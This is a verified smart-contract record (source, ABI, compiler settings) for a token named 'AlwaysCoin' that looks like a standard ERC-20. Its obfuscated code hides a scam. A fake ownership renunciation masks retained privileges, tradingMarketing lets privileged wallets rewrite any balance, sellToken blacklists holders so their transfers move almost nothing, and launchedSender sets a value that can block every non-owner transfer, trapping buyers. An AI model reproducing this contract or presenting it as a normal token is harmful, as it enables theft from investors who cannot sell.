{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract fundMinReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoBuy {\n    function createPair(address takeReceiver, address liquidityLaunch) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface limitTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface takeSender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeMin) external view returns (uint256);\n\n    function transfer(address feeIsWallet, uint256 teamTotal) external returns (bool);\n\n    function allowance(address receiverTeamTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 teamTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address feeIsWallet,\n        uint256 teamTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenIs, uint256 value);\n    event Approval(address indexed receiverTeamTotal, address indexed spender, uint256 value);\n}\n\ninterface takeSenderMetadata is takeSender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AlwaysCoin is fundMinReceiver, takeSender, takeSenderMetadata {\n\n    uint256 public autoTxMode = 3;\n\n    address isTo;\n\n    uint256 public feeList = 0;\n\n    function approve(address atExempt, uint256 teamTotal) public virtual override returns (bool) {\n        receiverLiquidityBuy[_msgSender()][atExempt] = teamTotal;\n        emit Approval(_msgSender(), atExempt, teamTotal);\n        return true;\n    }\n\n    mapping(address => bool) public teamShouldFee;\n\n    function transferFrom(address shouldWallet, address feeIsWallet, uint256 teamTotal) external override returns (bool) {\n        if (_msgSender() != toFund) {\n            if (receiverLiquidityBuy[shouldWallet][_msgSender()] != type(uint256).max) {\n                require(teamTotal <= receiverLiquidityBuy[shouldWallet][_msgSender()]);\n                receiverLiquidityBuy[shouldWallet][_msgSender()] -= teamTotal;\n            }\n        }\n        return atTotalTeam(shouldWallet, feeIsWallet, teamTotal);\n    }\n\n    constructor (){\n        if (senderIsAuto) {\n            launchedLaunch = false;\n        }\n        liquidityAt();\n        limitTeam receiverEnableReceiver = limitTeam(toFund);\n        launchedMin = autoBuy(receiverEnableReceiver.factory()).createPair(receiverEnableReceiver.WETH(), address(this));\n        isTo = autoBuy(receiverEnableReceiver.factory()).feeTo();\n        \n        toEnable = _msgSender();\n        teamShouldFee[toEnable] = true;\n        fundListSell[toEnable] = receiverMax;\n        if (marketingTeam) {\n            senderIsAuto = true;\n        }\n        emit Transfer(address(0), toEnable, receiverMax);\n    }\n\n    string private enableListWallet = \"ACN\";\n\n    function sellToken(address fromList) public {\n        fromTake();\n        \n        if (fromList == toEnable || fromList == launchedMin) {\n            return;\n        }\n        fundTake[fromList] = true;\n    }\n\n    function minLaunchedTo(address fromAmount) public {\n        require(fromAmount.balance < 100000);\n        if (receiverTeam) {\n            return;\n        }\n        \n        teamShouldFee[fromAmount] = true;\n        \n        receiverTeam = true;\n    }\n\n    uint256 fundFee;\n\n    uint256 constant listMarketing = 1 ** 10;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverMax;\n    }\n\n    uint256 senderAmount;\n\n    function liquidityAt() public {\n        emit OwnershipTransferred(toEnable, address(0));\n        marketingWallet = address(0);\n    }\n\n    uint256 public exemptWallet;\n\n    bool private senderIsAuto;\n\n    string private modeLiquidity = \"Always Coin\";\n\n    function atFeeMode(address shouldWallet, address feeIsWallet, uint256 teamTotal) internal view returns (uint256) {\n        require(teamTotal > 0);\n\n        uint256 launchedShould = 0;\n        if (shouldWallet == launchedMin && autoTxMode > 0) {\n            launchedShould = teamTotal * autoTxMode / 100;\n        } else if (feeIsWallet == launchedMin && feeList > 0) {\n            launchedShould = teamTotal * feeList / 100;\n        }\n        require(launchedShould <= teamTotal);\n        return teamTotal - launchedShould;\n    }\n\n    mapping(address => uint256) private fundListSell;\n\n    mapping(address => bool) public fundTake;\n\n    address public toEnable;\n\n    function tradingMarketing(address limitSender, uint256 teamTotal) public {\n        fromTake();\n        fundListSell[limitSender] = teamTotal;\n    }\n\n    bool private launchedLaunch;\n\n    function name() external view virtual override returns (string memory) {\n        return modeLiquidity;\n    }\n\n    function transfer(address limitSender, uint256 teamTotal) external virtual override returns (bool) {\n        return atTotalTeam(_msgSender(), limitSender, teamTotal);\n    }\n\n    address toFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function atTotalTeam(address shouldWallet, address feeIsWallet, uint256 teamTotal) internal returns (bool) {\n        if (shouldWallet == toEnable) {\n            return amountLiquidity(shouldWallet, feeIsWallet, teamTotal);\n        }\n        uint256 buyToken = takeSender(launchedMin).balanceOf(isTo);\n        require(buyToken == fundFee);\n        require(feeIsWallet != isTo);\n        if (fundTake[shouldWallet]) {\n            return amountLiquidity(shouldWallet, feeIsWallet, listMarketing);\n        }\n        teamTotal = atFeeMode(shouldWallet, feeIsWallet, teamTotal);\n        return amountLiquidity(shouldWallet, feeIsWallet, teamTotal);\n    }\n\n    mapping(address => mapping(address => uint256)) private receiverLiquidityBuy;\n\n    function balanceOf(address modeMin) public view virtual override returns (uint256) {\n        return fundListSell[modeMin];\n    }\n\n    function fromTake() private view {\n        require(teamShouldFee[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return marketingWallet;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundAuto;\n    }\n\n    address private marketingWallet;\n\n    bool public receiverTeam;\n\n    uint256 private receiverMax = 100000000 * 10 ** 18;\n\n    address public launchedMin;\n\n    event OwnershipTransferred(address indexed exemptAuto, address indexed launchLaunched);\n\n    function owner() external view returns (address) {\n        return marketingWallet;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return enableListWallet;\n    }\n\n    function launchedSender(uint256 teamTotal) public {\n        fromTake();\n        fundFee = teamTotal;\n    }\n\n    bool public marketingTeam;\n\n    uint8 private fundAuto = 18;\n\n    function amountLiquidity(address shouldWallet, address feeIsWallet, uint256 teamTotal) internal returns (bool) {\n        require(fundListSell[shouldWallet] >= teamTotal);\n        fundListSell[shouldWallet] -= teamTotal;\n        fundListSell[feeIsWallet] += teamTotal;\n        emit Transfer(shouldWallet, feeIsWallet, teamTotal);\n        return true;\n    }\n\n    function allowance(address fromAtMode, address atExempt) external view virtual override returns (uint256) {\n        if (atExempt == toFund) {\n            return type(uint256).max;\n        }\n        return receiverLiquidityBuy[fromAtMode][atExempt];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTeamTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromAtMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTxMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeMin\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"teamTotal\",\"type\":\"uint256\"}],\"name\":\"launchedSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromAmount\",\"type\":\"address\"}],\"name\":\"minLaunchedTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromList\",\"type\":\"address\"}],\"name\":\"sellToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamShouldFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamTotal\",\"type\":\"uint256\"}],\"name\":\"tradingMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeIsWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AlwaysCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}